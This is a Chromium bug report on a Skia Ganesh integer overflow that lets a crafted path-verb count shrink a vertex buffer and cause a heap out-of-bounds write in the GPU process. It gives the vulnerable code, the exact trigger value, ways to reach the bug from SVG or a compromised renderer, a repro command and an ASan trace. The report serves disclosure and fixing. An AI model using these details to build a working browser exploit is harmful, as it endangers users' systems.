# Heap OOB Write in Skia Ganesh Atlas Path Renderer via Signed Integer Overflow in PathStencilCoverOp

| Field | Value |
|-------|-------|
| **Issue ID** | [491191118](https://issues.chromium.org/issues/491191118) |
| **Status** | New |
| **Severity** | S3-Low |
| **Priority** | P0 |
| **Component** | Internals>Skia |
| **Platforms** | Android, Linux, Windows, ChromeOS |
| **Reporter** | qq...@calif.io |
| **Assignee** | mi...@google.com |
| **Created** | 2026-03-10 |
| **Bounty** | $32,000.00 |

## Description

A signed 32-bit integer overflow vulnerability exists in Skia's Ganesh backend, specifically within the `PathStencilCoverOp` class used by the Atlas Path Renderer. By providing a specifically crafted number of path verbs, an attacker can trigger a "positive wrap-around" during vertex buffer reservation. This results in a tiny memory allocation followed by a massive out-of-bounds (OOB) write of vertex data in the GPU process.

This vulnerability bypasses standard fail-fast aborts in Skia, that only catch negative-result overflows.

## Vulnerability Details

In PathStencilCoverOp.cpp:

```
int maxTrianglesInFans = std::max(fTotalCombinedPathVerbCnt - 2, 0);
if (VertexWriter triangleVertexWriter =
            vertexAlloc.lockWriter(sizeof(SkPoint), maxTrianglesInFans * 3)) {
    // ... subsequent loop writes billions of points ...
}

```

`maxTrianglesInFans * 3` is evaluated as a signed 32-bit `int`. Normally, if a calculation overflows INT\_MAX (2,147,483,647), it wraps to a negative number. If that happened here, the negative int would be promoted to a size\_t (unsigned 64-bit) during memory allocation, resulting in a massive number. Skia's allocator (GrCpuBuffer::Make) would catch this and safely SK\_ABORT.

However, 1,431,655,766 \* 3 = 4,294,967,298 and 4,294,967,298 modulo 2^32 equals 2. The result wraps entirely through the negative range and lands on 2, the size\_t promotion doesn't trigger any red flags.

lockWriter allocates space for exactly 2 vertices (16 bytes). The subsequent rendering loop then blindly writes out over 1.4 billion triangles into that 16-byte buffer, resulting in a out-of-bounds heap write in the GPU process.

Existing sanity check in AtlasRenderTask::canAdd only checks if the incoming verb count exceeds INT\_MAX. It fails because it doesn't account for the \* 3 multiplication that happens downstream during the actual buffer reservation.

## Reachability & Reliability

### Web Content (HTML/SVG)

Malicious SVG content can reach this sink by using high-verb paths and thousands of `<use>` elements. Triggering this via SVG can be "flaky" due to atlas tasks splitting or command buffer flushes. If the task is split before hitting the 1.43B mark, the overflow may fall into the "Negative Wrap" window and hit the safe abort instead.

The PoC uses 1x1 pixel paths and unique high-precision transforms to maximize atlas density and prevent task splitting.

### Compromised Renderer

This case will likely have higher reliability to trigger the crash, directly submit DrawPathOp.

## Repro

- OS: Linux x64
- Version: linux-release\_asan-linux-release-1596835

```
❯ ASAN_OPTIONS=detect_leaks=0:symbolize=1:fast_unwind_on_malloc=0 \
  ~/BAR/Chrome/linux-release_asan/chrome \
    --no-sandbox \
    --disable-skia-graphite \
    --enable-gpu-rasterization \
    --ignore-gpu-blocklist \
    atlas_path_positive_wrap_poc.html
WARNING: radv is not a conformant Vulkan implementation, testing use only.
[496912:496912:0310/013810.591270:ERROR:ui/ozone/platform/wayland/gpu/wayland_surface_factory.cc:252] '--ozone-platform=wayland' is not compatible with Vulkan. Consider switching to '--ozone-platform=x11' or disabling Vulkan
WARNING: radv is not a conformant Vulkan implementation, testing use only.
=================================================================
==496912==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x718c8d005820 at pc 0x5965235e08ff bp 0x7ffc98d854b0 sp 0x7ffc98d854a8
WRITE of size 8 at 0x718c8d005820 thread T0 (chrome)
==496912==WARNING: invalid path to external symbolizer!
==496912==WARNING: Failed to use and restart external symbolizer!
    #0 0x5965235e08fe  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2ad008fe) (BuildId: c307cc2e19af7361)
    #1 0x596523594162  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2acb4162) (BuildId: c307cc2e19af7361)
    #2 0x5965235d301a  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2acf301a) (BuildId: c307cc2e19af7361)
    #3 0x5965233bef8a  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aadef8a) (BuildId: c307cc2e19af7361)
    #4 0x59652335972b  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa7972b) (BuildId: c307cc2e19af7361)
    #5 0x596523357bd3  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa77bd3) (BuildId: c307cc2e19af7361)
    #6 0x59652335ab90  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa7ab90) (BuildId: c307cc2e19af7361)
    #7 0x596523353359  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa73359) (BuildId: c307cc2e19af7361)
    #8 0x5965232f49bb  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa149bb) (BuildId: c307cc2e19af7361)
    #9 0x596523677007  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2ad97007) (BuildId: c307cc2e19af7361)
    #10 0x59652ab6372f  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x3228372f) (BuildId: c307cc2e19af7361)
    #11 0x59652ae215c7  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x325415c7) (BuildId: c307cc2e19af7361)
    #12 0x59652ae1bade  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x3253bade) (BuildId: c307cc2e19af7361)
    #13 0x59652ae2669b  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x3254669b) (BuildId: c307cc2e19af7361)
    #14 0x5965144c3804  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbe3804) (BuildId: c307cc2e19af7361)
    #15 0x59652a5960db  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x31cb60db) (BuildId: c307cc2e19af7361)
    #16 0x59652a595341  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x31cb5341) (BuildId: c307cc2e19af7361)
    #17 0x59652a5b845c  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x31cd845c) (BuildId: c307cc2e19af7361)
    #18 0x59652a5c6447  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x31ce6447) (BuildId: c307cc2e19af7361)
    #19 0x59652a5c6229  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x31ce6229) (BuildId: c307cc2e19af7361)
    #20 0x596514506201  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bc26201) (BuildId: c307cc2e19af7361)
    #21 0x5965144da947  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbfa947) (BuildId: c307cc2e19af7361)
    #22 0x5965144d8978  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbf8978) (BuildId: c307cc2e19af7361)
    #23 0x5965144dc561  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbfc561) (BuildId: c307cc2e19af7361)
    #24 0x596521023ad6  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x28743ad6) (BuildId: c307cc2e19af7361)
    #25 0x59652109b289  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x287bb289) (BuildId: c307cc2e19af7361)
    #26 0x59652109a0fa  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x287ba0fa) (BuildId: c307cc2e19af7361)
    #27 0x596520ee32c7  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x286032c7) (BuildId: c307cc2e19af7361)
    #28 0x59652109c997  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x287bc997) (BuildId: c307cc2e19af7361)
    #29 0x596520f9f070  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x286bf070) (BuildId: c307cc2e19af7361)
    #30 0x59652c9408bc  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x340608bc) (BuildId: c307cc2e19af7361)
    #31 0x59651ccaa70f  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x243ca70f) (BuildId: c307cc2e19af7361)
    #32 0x59651ccaba3f  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x243cba3f) (BuildId: c307cc2e19af7361)
    #33 0x59651ccae748  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x243ce748) (BuildId: c307cc2e19af7361)
    #34 0x59651cca8121  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x243c8121) (BuildId: c307cc2e19af7361)
    #35 0x59651cca871c  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x243c871c) (BuildId: c307cc2e19af7361)
    #36 0x59650984fb39  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x10f6fb39) (BuildId: c307cc2e19af7361)
    #37 0x758cdb22a1c9  (/lib/x86_64-linux-gnu/libc.so.6+0x2a1c9) (BuildId: 8e9fd827446c24067541ac5390e6f527fb5947bb)
    #38 0x758cdb22a28a  (/lib/x86_64-linux-gnu/libc.so.6+0x2a28a) (BuildId: 8e9fd827446c24067541ac5390e6f527fb5947bb)
    #39 0x596509775029  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x10e95029) (BuildId: c307cc2e19af7361)

0x718c8d005820 is located 0 bytes after 3145760-byte region [0x718c8cd05800,0x718c8d005820)
allocated by thread T0 (chrome) here:
    #0 0x59650984e3fd  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x10f6e3fd) (BuildId: c307cc2e19af7361)
    #1 0x596523365751  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa85751) (BuildId: c307cc2e19af7361)
    #2 0x59652336676d  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa8676d) (BuildId: c307cc2e19af7361)
    #3 0x5965233682d4  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa882d4) (BuildId: c307cc2e19af7361)
    #4 0x59652336768e  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa8768e) (BuildId: c307cc2e19af7361)
    #5 0x596523369ac8  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa89ac8) (BuildId: c307cc2e19af7361)
    #6 0x5965235e3129  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2ad03129) (BuildId: c307cc2e19af7361)
    #7 0x5965235df0d0  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2acff0d0) (BuildId: c307cc2e19af7361)
    #8 0x596523594162  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2acb4162) (BuildId: c307cc2e19af7361)
    #9 0x5965235d301a  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2acf301a) (BuildId: c307cc2e19af7361)
    #10 0x5965233bef8a  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aadef8a) (BuildId: c307cc2e19af7361)
    #11 0x59652335972b  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa7972b) (BuildId: c307cc2e19af7361)
    #12 0x596523357bd3  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa77bd3) (BuildId: c307cc2e19af7361)
    #13 0x59652335ab90  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa7ab90) (BuildId: c307cc2e19af7361)
    #14 0x596523353359  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa73359) (BuildId: c307cc2e19af7361)
    #15 0x5965232f49bb  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa149bb) (BuildId: c307cc2e19af7361)
    #16 0x596523677007  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2ad97007) (BuildId: c307cc2e19af7361)
    #17 0x59652ab6372f  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x3228372f) (BuildId: c307cc2e19af7361)
    #18 0x59652ae215c7  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x325415c7) (BuildId: c307cc2e19af7361)
    #19 0x59652ae1bade  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x3253bade) (BuildId: c307cc2e19af7361)
    #20 0x59652ae2669b  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x3254669b) (BuildId: c307cc2e19af7361)
    #21 0x5965144c3804  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbe3804) (BuildId: c307cc2e19af7361)
    #22 0x59652a5960db  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x31cb60db) (BuildId: c307cc2e19af7361)
    #23 0x59652a595341  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x31cb5341) (BuildId: c307cc2e19af7361)
    #24 0x59652a5b845c  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x31cd845c) (BuildId: c307cc2e19af7361)
    #25 0x59652a5c6447  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x31ce6447) (BuildId: c307cc2e19af7361)
    #26 0x59652a5c6229  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x31ce6229) (BuildId: c307cc2e19af7361)
    #27 0x596514506201  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bc26201) (BuildId: c307cc2e19af7361)

SUMMARY: AddressSanitizer: heap-buffer-overflow (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2ad008fe) (BuildId: c307cc2e19af7361)
Shadow bytes around the buggy address:
  0x718c8d005580: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x718c8d005600: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x718c8d005680: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x718c8d005700: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x718c8d005780: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x718c8d005800: 00 00 00 00[fa]fa fa fa fa fa fa fa fa fa fa fa
  0x718c8d005880: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x718c8d005900: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x718c8d005980: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x718c8d005a00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x718c8d005a80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==496912==ADDITIONAL INFO

==496912==Note: Please include this section with the ASan report.
Task trace:
    #0 0x5965144d8e52  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbf8e52) (BuildId: c307cc2e19af7361)
    #1 0x5965144d8e52  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbf8e52) (BuildId: c307cc2e19af7361)
    #2 0x5965144d8e52  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbf8e52) (BuildId: c307cc2e19af7361)
    #3 0x5965144d8e52  (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbf8e52) (BuildId: c307cc2e19af7361)


Command line: `/proc/self/exe --type=gpu-process --no-sandbox --enable-gpu-rasterization --disable-skia-graphite --ozone-platform=wayland --render-node-override=/dev/dri/renderD128 --crashpad-handler-pid=496847 --enable-crash-reporter=, --disable-breakpad --change-stack-guard-on-fork=enable --gpu-preferences=UAAAAAAAAAAgAQAMAAAAAAAAAAAAAMAAAQAAAAAAAAAAAAAAAAAAABARAAAAAAAAAAAAAAAAAAAAYAAAAAAAAABgAAAAAAAAAAAAAAAAAAABARAAAAAAAAAAgAAAAAAAAA --shared-files --metrics-shmem-handle=4,i,16645483194146379830,13614428731174699156,262144 --field-trial-handle=3,i,16897643971091495548,14934545461432251507,262144 --disable-features=EyeDropper --variations-seed-version --pseudonymization-salt-handle=7,i,7050076991723637085,12779248270297361537,4 --trace-process-track-uuid=3190708988185955192`


==496912==END OF ADDITIONAL INFO

==496912==ABORTING
[496833:496833:0310/013829.400627:ERROR:content/browser/gpu/gpu_process_host.cc:999] GPU process exited unexpectedly: exit_code=256
WARNING: radv is not a conformant Vulkan implementation, testing use only.
[497231:497231:0310/013829.802338:ERROR:ui/ozone/platform/wayland/gpu/wayland_surface_factory.cc:252] '--ozone-platform=wayland' is not compatible with Vulkan. Consider switching to '--ozone-platform=x11' or disabling Vulkan
WARNING: radv is not a conformant Vulkan implementation, testing use only.
[497231:497231:0310/013842.871202:FATAL:third_party/skia/src/gpu/ganesh/GrCpuBuffer.h:27] Buffer size is too big.
#0 0x5965097bc9f6 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x10edc9f5)
#1 0x5965211ef198 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2890f197)
#2 0x5965211acc57 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x288ccc56)
#3 0x596520eb6e05 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x285d6e04)
#4 0x596520eb6970 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x285d696f)
#5 0x596523084a6b (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2a7a4a6a)
#6 0x596523365a3f (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa85a3e)
#7 0x59652336676e (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa8676d)
#8 0x5965233682d5 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa882d4)
#9 0x59652336768f (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa8768e)
#10 0x596523369ac9 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa89ac8)
#11 0x5965235e312a (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2ad03129)
#12 0x5965235df0d1 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2acff0d0)
#13 0x596523594163 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2acb4162)
#14 0x5965235d301b (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2acf301a)
#15 0x5965233bef8b (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aadef8a)
#16 0x59652335972c (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa7972b)
#17 0x596523357bd4 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa77bd3)
#18 0x59652335ab91 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa7ab90)
#19 0x59652335335a (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa73359)
#20 0x59652341df27 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2ab3df26)
#21 0x59652341b915 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2ab3b914)
#22 0x59652341f0c6 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2ab3f0c5)
#23 0x5965232f7a92 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa17a91)
#24 0x5965232f5c27 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa15c26)
#25 0x5965232f6196 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa16195)
#26 0x59652ad35f32 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x32455f31)
#27 0x59652ad10899 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x32430898)
#28 0x59652a5d8d10 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x31cf8d0f)
#29 0x59652ae44d7a (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x32564d79)
#30 0x59652ae43867 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x32563866)
#31 0x59652a5b8254 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x31cd8253)
#32 0x59652a5c6448 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x31ce6447)
#33 0x59652a5c622a (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x31ce6229)
#34 0x596514506202 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bc26201)
#35 0x5965144da948 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbfa947)
#36 0x5965144d8979 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbf8978)
#37 0x5965144dc562 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbfc561)
#38 0x596521023ad7 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x28743ad6)
#39 0x59652109b28a (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x287bb289)
#40 0x59652109a0fb (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x287ba0fa)
#41 0x596520ee32c8 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x286032c7)
#42 0x59652109c998 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x287bc997)
#43 0x596520f9f071 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x286bf070)
#44 0x59652c9408bd (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x340608bc)
#45 0x59651ccaa710 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x243ca70f)
#46 0x59651ccaba40 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x243cba3f)
#47 0x59651ccae749 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x243ce748)
#48 0x59651cca8122 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x243c8121)
#49 0x59651cca871d (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x243c871c)
#50 0x59650984fb3a (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x10f6fb39)
#51 0x758cdb22a1ca (/usr/lib/x86_64-linux-gnu/libc.so.6+0x2a1c9)
#52 0x758cdb22a28b (/usr/lib/x86_64-linux-gnu/libc.so.6+0x2a28a)
#53 0x59650977502a (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x10e95029)
Task trace:
#0 0x5965144d8e53 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbf8e52)
#1 0x5965144d8e53 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbf8e52)
#2 0x5965144d8e53 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbf8e52)
#3 0x5965144d8e53 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbf8e52)
#4 0x5965144d8e53 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbf8e52)
Task trace buffer limit hit, update PendingTask::kTaskBacktraceLength to increase.
Crash keys:
  "gpu-url-chunk" = "file:///home/FOO/sec/chromium/src/skia_poc/atlas_path_positive_wrap_poc.html"
  "gpu-gl-context-is-virtual" = "0"
  "vulkan-device-name" = "AMD Radeon BAR PRO R9700 (RADV GFX1201)"
  "vulkan-device-type" = "discrete"
  "vulkan-device-id" = "0x7551"
  "vulkan-device-vendor-id" = "0x1002"
  "vulkan-device-driver-version" = "25.2.8"
  "vulkan-device-api-version" = "1.4.318"
  "variations" = "1db03297-3f4a17df,b1755f03-e38596b7,6f27bc8a-3f4a17df,c203d55b-3f4a17df,cf16e290-b446100,a66dbd64-71c38a98,e32097a3-3f4a17df,102166ac-3f4a17df,89986dbe-3f01b610,b13ca3d9-84f6cff8,f2b6a878-3f4a17df,32806e4f-28ea5088,2468d6e5-3f4a17df,f5a1eb9a-3f4a17df,a66fd611-3f4a17df,decd384-3f4a17df,ac59e11a-3f4a17df,836f1ad3-3f4a17df,8f6c5cc6-3f4a17df,94e21eca-3f4a17df,d6284ba0-9610fd4e,73551ca1-3f4a17df,d6737162-3f4a17df,e35cc1a-3f4a17df,e5a1483c-3f4a17df,6a68c9a6-3f4a17df,c1531af3-3f4a17df,47a0a3b2-3f4a17df,17f1f5fe-3f4a17df,1b0dc97-3f4a17df,2c561bd6-3f4a17df,97063883-1f820d08,7b46cc51-3f4a17df,d4754f61-3f4a17df,af00e384-3f4a17df,8f80c10-78198108,a62c052e-3f4a17df,a4ca7cb1-3f4a17df,da968c94-3f4a17df,ae727645-d13781e7,e435811b-3f4a17df,f1d165c0-3f4a17df,ec937206-3f4a17df,5eb9e4fc-3f4a17df,cad2b12b-8ef57898,57d6085b-3f4a17df,fb92da45-3f4a17df,d6ad7f9a-a9080253,9507cc99-f2018abe,2940f5d3-3f4a17df,a5ecfb95-3f4a17df,797fe373-3f4a17df,ead3e59e-8c7df51c,a3b91d85-3f4a17df,17a43872-3f4a17df,1ffefb1a-3f4a17df,f419bc72-3f4a17df,470d37ba-3f4a17df,f7d06457-e9d42fcd,bcb58f65-3f4a17df,d512da3a-513c429d,54d601a5-3f4a17df,63f121e7-3f4a17df,98ab2bc2-b6dc7ce0,600d2fa6-3f4a17df,bca7ba0b-8cb78501,40355e18-3f4a17df,ff1e0777-3f4a17df,999e8980-6ec7edcb,b6083631-447a6f32,4dc2f223-3f4a17df,4a2d56fe-3f4a17df,5133eb43-307b98b1,2d36b960-a68c6def,f314f5b9-a2b13a7f,6e4a21fe-efc28565,531e1626-4513f3bf,820f17d2-e484eeec,40debc11-3f4a17df,12733ec4-3f4a17df,44666d99-3d47f4f4,e14ee5ee-c6d6098d,fd051c38-3f4a17df,a98def31-2a5a8f5d,284a13f5-3f4a17df,fc1790de-3f4a17df,35c106c9-3f4a17df,639ee5d3-3f4a17df,7dcaa2cd-3f4a17df,57d26b38-3f4a17df,f6f5c542-3f4a17df,5e05ef36-3f4a17df,18324944-3f4a17df,3779be93-3f4a17df,707ac2b5-3f4a17df,caf19648-74472b0b,3b02c079-3f4a17df,54b15be4-e3ec50a6,669a7db8-3f4a17df,68f499c8-d24710ce,350559e5-3f4a17df,91cba98-b3b3bb94,6a6ab26-faa329bf,c75c6bbe-3f4a17df,4eb998ce-3f4a17df,9d5ecd8d-ca7d8d80,a9776a9b-3f4a17df,3e15bfc6-3f4a17df,e3d19f5b-3f4a17df,3d9fe79-3f4a17df,af41f030-3f4a17df,4b781a51-23ee7c7b,2f4e13c7-3f4a17df,335ba8a6-79d4b4f6,8f4b3221-3f4a17df,779782d3-3f4a17df,e1d656a5-3f4a17df,e5c8270a-3f4a17df,ef3132a9-3f4a17df,3042ad4b-ad2fa222,87bc8a34-3f4a17df,96def758-3f4a17df,2d3e25b-3f4a17df,151258bf-3f4a17df,13e8c923-3f4a17df,3e672fd9-e109e63f,ae1581ef-35f6ea04,893cc7a4-3f4a17df,3c978b59-3f4a17df,9cf6c713-7585e9f1,4ab30a87-c9361ef3,78049c75-f7dfe51d,c297985a-3f4a17df,a3ce8da1-3f4a17df,22946be1-22946be1,6ddea229-6ddea229,e41e244a-3f4a17df,31f4a8bd-3f4a17df,d4daab79-3f4a17df,acf2401-ec6cb59a,96d006a-c3a49e71,f6264095-c3f8eab0,f42905ff-3f4a17df,2faf225b-3f4a17df,74be468c-3f4a17df,4fcb1c2f-3f4a17df,4146cc26-775f6248,e9844d40-3f4a17df,2b68be8f-3f4a17df,d1ae5bf4-3f4a17df,15d1b2d8-3f4a17df,7ca2dd7e-3f4a17df,8ac8acb3-3f4a17df,55cc39e1-3f4a17df,ba449693-695908d9,cad46b80-3f4a17df,70404afa-803f8fc4,fecdbadb-3f4a17df,8978ce4e-cf4f6ead,8643cb65-cf4f6ead,e6ed801e-cf4f6ead,ff7d412f-3f4a17df,fc9ceed7-ee2a48b4,89a375de-3f4a17df,4af38a69-3c635604,6ff79bbe-3f4a17df,aaa52086-d50cce67,b0b97cfb-3f4a17df,c823d1e9-3d47f4f4,66657049-3f4a17df,36860c1b-3f4a17df,7262ef2c-140d00b2,f93c9364-3f4a17df,b4c2bd17-23db2647,6ec84df5-3f4a17df,b86bee04-3f4a17df,9e5c75f1-30e1b12b,4d625646-3f4a17df,ec3153de-3f4a17df,2394f90f-ecc8f8cf,d5f746a4-39aaf314,56aa5797-e5fec5a6,54be7848-3f4a17df,e2d38844-3f4a17df,5c131b25-3f4a17df,eef5d69a-1dca273f,da493d3c-3f4a17df,72bafd3e-cdb4c186,f659c5ca-3f4a17df,f3ed486d-3f4a17df,81c84cff-6154888c,b3c54bb3-88fcaf7d,4076100b-3f4a17df,8c162025-3d47f4f4,9f8a0fd2-b4a3cd0c,ffdf4988-3f4a17df,3d3963fc-5d65cee9,3ac9fcb9-3f4a17df,b446c562-3f4a17df,63831cab-3f4a17df,d2a642a0-3f4a17df,7ece8311-3f4a17df,7a32e64e-3f4a17df,8579ead7-3f4a17df,f108c955-3f4a17df,10713630-3f4a17df,b76b514f-3ac589b9,8f418b04-299bae22,d3566fbd-c6f74b94,147e9ecd-3f4a17df,d06639a1-3f4a17df,ed2195eb-3f4a17df,de028327-70abd7a5,2ca06d17-3f4a17df,a2f28ef8-d7d235fa,5abe5347-3f4a17df,35a386c3-3f4a17df,45a2f2f-f9e1b5a8,d5ce1427-3f4a17df,afeeb5d0-3f4a17df,186d6e2c-36c0e608,6cc45990-3f4a17df,951dcd0c-3f4a17df,4ea303a6-ecbb250e,ab7eb98c-3f4a17df,258151b3-3f4a17df,4fa4e3b8-3f4a17df,44fe0078-3f4a17df,c92d2cc4-3f4a17df,2468be5e-5f6398dc,aa540f4f-3f4a17df,30cf4980-61673e6,9850104b-395bafa,19e446cd-3f4a17df,f613598-3f4a17df,f3b6291d-7fa80c0f,bf46f37a-3f4a17df,40de0170-3f4a17df,2d2b187a-3f4a17df,f86bc1e2-3f4a17df,8ec87690-6aac4626,e6ec9393-3f4a17df,ea0d881d-fd860968,3f752d-3f4a17df,25a81d51-3f4a17df,53c64de7-3f4a17df,e3559213-c0f46cd5,89bba52e-174ae9a8,444b9649-3f4a17df,d990c4ac-3f4a17df,a374fdf0-964ff297,59eb375d-3f4a17df,23226e84-65